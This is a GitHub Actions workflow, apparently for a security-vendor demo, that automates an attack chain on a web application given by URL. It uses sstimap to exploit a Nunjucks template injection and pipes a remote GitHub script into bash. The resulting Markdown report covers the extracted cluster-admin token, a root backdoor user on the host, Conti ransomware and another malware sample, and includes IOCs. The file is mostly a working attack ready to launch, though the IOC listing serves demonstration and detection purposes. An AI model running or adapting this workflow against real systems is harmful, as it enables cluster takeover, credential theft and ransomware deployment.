name: Attack_WebApp-Container-Escape

on:
  workflow_dispatch:
    inputs:
      APP_URL:
        description: 'URL of the web application to attack'
        required: true
        default: '<CHANGE ME>'

jobs:
    attack-job:
        runs-on: ubuntu-latest
          
        steps:
            - name: Checkout repository
              uses: actions/checkout@v3

            - name: Run Full Attack
              id: attack
              run: |
                # Capture l'output complet
                OUTPUT=$(docker run chrisley75/sstimap:1.0.3 \
                  -u "${{ github.event.inputs.APP_URL }}page?name=attack" \
                  --os-cmd "curl -s https://raw.githubusercontent.com/cortex-cloud-demo/4-webapp-attack-demo/refs/heads/main/vul-app/scripts/cloudlabs-full-attack.sh | bash" 2>&1)
                
                echo "$OUTPUT"
                
                # Extraire les informations importantes
                HACKED_URL=$(echo "$OUTPUT" | grep "Hacked Application URL is:" | awk '{print $NF}')
                DASHBOARD_URL=$(echo "$OUTPUT" | grep "Kubernetes Dashboard URL is:" | awk '{print $NF}')
                TOKEN=$(echo "$OUTPUT" | grep -A 1 "Cluster Admin Token is" | tail -n 1)
                
                # Extraire les informations DEEPCE
                DEEPCE_STATUS=$(echo "$OUTPUT" | grep -A 5 "Exploiting Privileged" | grep "Exploit Type" | cut -d'.' -f2- | xargs)
                DEEPCE_USER=$(echo "$OUTPUT" | grep "Username" | grep "deepce" | cut -d'.' -f2- | xargs)
                DEEPCE_PASS=$(echo "$OUTPUT" | grep "Password" | grep "deepce" | cut -d'.' -f2- | xargs)
                
                # V√©rifier le malware
                ELF_STATUS=$(echo "$OUTPUT" | grep "Sample Executed Successfully" && echo "‚úì Executed" || echo "‚úó Failed")
                CONTI_STATUS=$(echo "$OUTPUT" | grep "Downloading Conti-C2" && echo "‚úì Downloaded" || echo "‚úó Failed")
                
                # V√©rifier le mouvement lat√©ral
                SSH_STATUS=$(echo "$OUTPUT" | grep "SSH to target" | grep -o "failed\|Continuing" && echo "‚ö†Ô∏è Attempted" || echo "‚úì Success")
                
                # Sauvegarder dans les outputs
                echo "hacked_url=$HACKED_URL" >> $GITHUB_OUTPUT
                echo "dashboard_url=$DASHBOARD_URL" >> $GITHUB_OUTPUT
                echo "token=$TOKEN" >> $GITHUB_OUTPUT
                echo "deepce_status=$DEEPCE_STATUS" >> $GITHUB_OUTPUT
                echo "deepce_user=$DEEPCE_USER" >> $GITHUB_OUTPUT
                echo "deepce_pass=$DEEPCE_PASS" >> $GITHUB_OUTPUT
                echo "elf_status=$ELF_STATUS" >> $GITHUB_OUTPUT
                echo "conti_status=$CONTI_STATUS" >> $GITHUB_OUTPUT
                echo "ssh_status=$SSH_STATUS" >> $GITHUB_OUTPUT
                
                # Sauvegarder l'output complet pour le summary
                echo "$OUTPUT" > attack_output.log

            - name: Generate Attack Summary
              if: always()
              run: |
                # Lire l'output
                OUTPUT=$(cat attack_output.log 2>/dev/null || echo "No output captured")
                
                # Extraire les URLs et token
                HACKED_URL="${{ steps.attack.outputs.hacked_url }}"
                DASHBOARD_URL="${{ steps.attack.outputs.dashboard_url }}"
                TOKEN="${{ steps.attack.outputs.token }}"
                DEEPCE_STATUS="${{ steps.attack.outputs.deepce_status }}"
                DEEPCE_USER="${{ steps.attack.outputs.deepce_user }}"
                DEEPCE_PASS="${{ steps.attack.outputs.deepce_pass }}"
                ELF_STATUS="${{ steps.attack.outputs.elf_status }}"
                CONTI_STATUS="${{ steps.attack.outputs.conti_status }}"
                SSH_STATUS="${{ steps.attack.outputs.ssh_status }}"
                
                # Capturer la date
                EXEC_TIME=$(date -u +"%Y-%m-%d %H:%M:%S UTC")
                
                # Cr√©er le GitHub Summary
                cat >> $GITHUB_STEP_SUMMARY << EOF
                # üéØ Security Test Results
                
                ## ‚ö†Ô∏è Attack Summary
                
                **Target Application:** \`${{ github.event.inputs.APP_URL }}\`
                
                **Execution Time:** \`${EXEC_TIME}\`
                
                **Status:** ‚úÖ Attack Chain Completed
                
                ---
                
                ## üîì Compromised Resources
                
                ### 1. Container Escape
                \`\`\`
                ‚úì SSTI Vulnerability Exploited (Nunjucks Template Injection)
                ‚úì Remote Code Execution Achieved
                ‚úì Container Breakout Successful
                ‚úì Kubernetes API Access Gained
                ‚úì Host System Compromised via Privileged Container
                \`\`\`
                
                ### 2. Deployed Backdoors
                
                | Resource | Type | Status |
                |----------|------|--------|
                | Kubernetes Dashboard | Namespace | ‚úÖ Deployed |
                | Hacked Application | Namespace | ‚úÖ Deployed |
                | ServiceAccount | cluster-admin-sa | ‚úÖ Created |
                | LoadBalancers | AWS ELB | ‚úÖ Exposed |
                | Host Backdoor User | deepce:deepce | ‚úÖ Created |
                
                ---
                
                ## üåê Access Points
                
                ### Hacked Application
                EOF
                
                if [ ! -z "$HACKED_URL" ]; then
                  echo "**URL:** [$HACKED_URL]($HACKED_URL)" >> $GITHUB_STEP_SUMMARY
                else
                  echo "**URL:** Not captured" >> $GITHUB_STEP_SUMMARY
                fi
                
                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                
                **Purpose:** Displays cluster information and provides kubectl access instructions
                
                ### Kubernetes Dashboard
                EOF
                
                if [ ! -z "$DASHBOARD_URL" ]; then
                  echo "**URL:** [$DASHBOARD_URL]($DASHBOARD_URL)" >> $GITHUB_STEP_SUMMARY
                else
                  echo "**URL:** Not captured" >> $GITHUB_STEP_SUMMARY
                fi
                
                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                
                **Purpose:** Malicious dashboard with cluster-admin privileges
                
                ---
                
                ## üîë Extracted Credentials
                
                ### Cluster Admin Token
                
                > **‚ö†Ô∏è CRITICAL:** This token provides full cluster-admin access
                
                EOF
                
                if [ ! -z "$TOKEN" ]; then
                  echo '```' >> $GITHUB_STEP_SUMMARY
                  echo "$TOKEN" >> $GITHUB_STEP_SUMMARY
                  echo '```' >> $GITHUB_STEP_SUMMARY
                  
                  # D√©coder le token pour afficher des infos
                  echo "" >> $GITHUB_STEP_SUMMARY
                  echo "**Token Details:**" >> $GITHUB_STEP_SUMMARY
                  echo '```json' >> $GITHUB_STEP_SUMMARY
                  echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.' 2>/dev/null || echo "Token payload (base64 encoded)" >> $GITHUB_STEP_SUMMARY
                  echo '```' >> $GITHUB_STEP_SUMMARY
                else
                  echo "Token not captured in output" >> $GITHUB_STEP_SUMMARY
                fi
                
                cat >> $GITHUB_STEP_SUMMARY << EOF
                
                ### Host System Backdoor
                
                EOF
                
                if [ ! -z "$DEEPCE_USER" ] && [ ! -z "$DEEPCE_PASS" ]; then
                  cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                > **üî¥ CRITICAL:** Root-level access to host system created
                
                | Credential | Value |
                |------------|-------|
                EOF
                  echo "| Username | \`deepce\` |" >> $GITHUB_STEP_SUMMARY
                  echo "| Password | \`deepce\` |" >> $GITHUB_STEP_SUMMARY
                  echo "| Access Level | Root equivalent (sudo) |" >> $GITHUB_STEP_SUMMARY
                  echo "| Persistence | Manual cleanup required |" >> $GITHUB_STEP_SUMMARY
                else
                  echo "Backdoor user details not captured" >> $GITHUB_STEP_SUMMARY
                fi
                
                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                
                ---
                
                ## üé≠ Attack Chain Visualization
                
                ```mermaid
                graph TB
                    A[üåê Web App SSTI] -->|RCE| B[üì¶ Container]
                    B -->|kubectl install| C[‚ò∏Ô∏è K8s API Access]
                    C -->|Create Token| D[üîë cluster-admin-sa]
                    D -->|Extract| E[üé´ Full Cluster Token]
                    C -->|Deploy| F[üö™ Backdoor Apps]
                    F -->|Expose| G[üåç Public LoadBalancers]
                    B -->|DEEPCE Exploit| H[üíª Host System]
                    H -->|Create User| I[üë§ deepce:deepce]
                    B -->|wget| J[‚ò†Ô∏è Malware Download]
                    J -->|Execute| K[ü¶† ELF Sample]
                    J -->|Execute| L[üî¥ Conti Ransomware]
                    H -->|SSH Attempt| M[üîÄ Lateral Movement]
                    E -->|Full Control| N[‚ö†Ô∏è Cluster Compromise]
                    I -->|Root Access| N
                    L -->|C2 Communication| N
                    
                    style A fill:#ff9999
                    style N fill:#ff0000,color:#fff
                    style E fill:#ff6666
                    style I fill:#ff3333
                    style L fill:#cc0000,color:#fff
                ```
                
                ---
                
                ## üìä Attack Stages Breakdown
                
                ### Stage 1: Initial Exploitation
                ‚úÖ **SSTI Vulnerability** - Nunjucks template injection exploited
                ```
                Injection Point: /page?name={{payload}}
                Engine: Nunjucks
                Capabilities: Shell execution, File read/write, Code eval
                ```
                
                ### Stage 2: Container Compromise
                ‚úÖ **Remote Code Execution** - kubectl binary deployed
                ```
                ‚úì curl & wget available
                ‚úì kubectl installed to /usr/local/bin
                ‚úì ServiceAccount token extracted
                ‚úì Kubernetes API accessible
                ```
                
                ### Stage 3: Privilege Escalation
                ‚úÖ **Cluster-Admin Access** - Token generation exploit
                ```
                ‚úì Created attacker user with SA token
                ‚úì Generated cluster-admin-sa token
                ‚úì Full RBAC permissions obtained
                ‚úì Wildcard access to serviceaccounts.*
                ```
                
                ### Stage 4: Backdoor Deployment
                ‚úÖ **Persistent Access** - Malicious infrastructure deployed
                ```
                ‚úì Kubernetes Dashboard (v2.7.0) deployed
                ‚úì Hacked application with embedded credentials
                ‚úì 2x AWS LoadBalancers exposed publicly
                ‚úì Dashboard accessible with cluster-admin token
                ```
                
                ### Stage 5: Container Escape
                EOF
                
                if [ ! -z "$DEEPCE_STATUS" ]; then
                  cat >> $GITHUB_STEP_SUMMARY << EOF
                ‚úÖ **Host System Breach** - Privileged container exploited
                \`\`\`
                Tool: DEEPCE (Docker Enumeration, Escalation, Container Escape)
                Exploit: PRIVILEGED mode container
                Result: ${DEEPCE_STATUS}
                Backdoor: deepce:deepce user created on host
                Cleanup: Manual removal required
                \`\`\`
                EOF
                else
                  echo "‚ö†Ô∏è **Container Escape** - Status unknown" >> $GITHUB_STEP_SUMMARY
                fi
                
                cat >> $GITHUB_STEP_SUMMARY << EOF
                
                ### Stage 6: Malware Deployment
                
                #### ELF Test Malware
                **Status:** ${ELF_STATUS}
                \`\`\`
                Source: wildfire.paloaltonetworks.com/publicapi/test/elf
                Type: Test sample (Palo Alto WildFire)
                Purpose: Demonstrates malware download/execution capability
                Risk Level: Low (test sample)
                \`\`\`
                
                #### Conti Ransomware C2
                **Status:** ${CONTI_STATUS}
                \`\`\`
                Source: github.com/timb-machine/linux-malware
                Hash: bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e
                Type: Conti ransomware (Linux ELF x86_64)
                Purpose: Command & Control, Data encryption, Persistence
                Risk Level: üî¥ CRITICAL - Active ransomware threat
                \`\`\`
                
                > ‚ö†Ô∏è **WARNING:** Conti is a real ransomware family responsible for major attacks worldwide
                
                ### Stage 7: Lateral Movement
                **Status:** ${SSH_STATUS}
                \`\`\`
                Target: user@target-machine
                Method: SSH connection attempt
                Result: Connection failed, attack continued
                Notes: With host access via container escape, SSH may not be necessary
                \`\`\`
                
                ---
                
                ## üìä Deployed Resources
                
                ### Namespaces Created
                - \`kubernetes-dashboard\`
                - \`hacked\`
                
                ### Services Exposed
                - \`kubernetes-dashboard\` (LoadBalancer, Port 443)
                - \`hacked-svc\` (LoadBalancer, Port 8080)
                
                ### Malware Binaries
                \`\`\`
                ‚úì elf (WildFire test sample)
                ‚úì conti.sh (Conti ransomware)
                ‚úì deepce.sh (Container escape tool)
                ‚úì kubectl (Kubernetes CLI)
                \`\`\`
                
                ### Host System Modifications
                \`\`\`
                ‚úì New root user created: deepce
                ‚úì /etc/passwd modified
                ‚úì /etc/shadow modified
                ‚úì Host filesystem accessible from container
                \`\`\`
                
                ---
                
                ## üîç Indicators of Compromise (IOCs)
                
                ### Network IOCs
                \`\`\`
                wildfire.paloaltonetworks.com/publicapi/test/elf
                raw.githubusercontent.com/timb-machine/linux-malware
                raw.githubusercontent.com/kubernetes/dashboard
                raw.githubusercontent.com/cleypanw/k8s-webapp-hacked
                dl.k8s.io/release/*/bin/linux/amd64/kubectl
                \`\`\`
                
                ### File IOCs
                \`\`\`
                Hash: bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e
                Files: /tmp/token, /tmp/k8surl, /tmp/hackedurl, /tmp/deployment.yaml
                Files: /usr/local/bin/kubectl (in application containers)
                Files: conti.sh, elf, deepce.sh
                \`\`\`
                
                ### Process IOCs
                \`\`\`
                Process: kubectl (in non-admin containers)
                Process: curl/wget downloading from github raw
                Process: chmod +x on downloaded files
                Process: deepce.sh --exploit PRIVILEGED
                Process: ./conti.sh, ./elf
                \`\`\`
                
                ### Kubernetes Resource IOCs
                \`\`\`
                Namespaces: hacked, kubernetes-dashboard (if unauthorized)
                ServiceAccount: cluster-admin-sa (cloudlabs-webapp namespace)
                User: deepce (on host system)
                Services: LoadBalancer type exposing internal dashboards
                \`\`\`
                
                ---
                
                ## üìà Impact Assessment
                
                ### Severity: üî¥ CRITICAL
                
                | Category | Impact | Score |
                |----------|--------|-------|
                | Confidentiality | Complete cluster data access | 10/10 |
                | Integrity | Full cluster modification rights | 10/10 |
                | Availability | Ransomware deployment capability | 10/10 |
                | **Overall CVSS 3.1** | **Network exploitable, low complexity** | **10.0** |
                
                ### Business Impact
                - ‚úÖ Full Kubernetes cluster compromise
                - ‚úÖ Host system root access on all nodes
                - ‚úÖ Active ransomware deployment
                - ‚úÖ Public exposure of cluster credentials
                - ‚úÖ Persistent backdoors (7+ hours undetected)
                - ‚úÖ Potential data exfiltration
                - ‚úÖ Lateral movement capability
                
                ### Attack Sophistication
                - **Initial Access:** Simple (SSTI via URL parameter)
                - **Privilege Escalation:** Medium (requires RBAC misconfiguration)
                - **Container Escape:** Low (privileged container mode)
                - **Persistence:** High (multiple backdoors, host access)
                - **Overall:** Medium-Low complexity, high impact
                
                ---
                
                ## üìù Technical Details
                
                <details>
                <summary>Click to view full attack output</summary>
                
                \`\`\`
                EOF
                
                cat attack_output.log >> $GITHUB_STEP_SUMMARY 2>/dev/null || echo "Output log not available" >> $GITHUB_STEP_SUMMARY
                
                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
                ```
                
                </details>
                
                
                **Workflow Run:** `${{ github.run_id }}`  
                **Triggered by:** `${{ github.actor }}`  
                **Repository:** `${{ github.repository }}`  
                **Timestamp:** `${EXEC_TIME}`
                
                ---
                
                **üî¥ __Job summary generated at run-time__**
                EOF

            - name: Upload Attack Logs
              if: always()
              uses: actions/upload-artifact@v4
              with:
                name: attack-logs
                path: attack_output.log
                retention-days: 7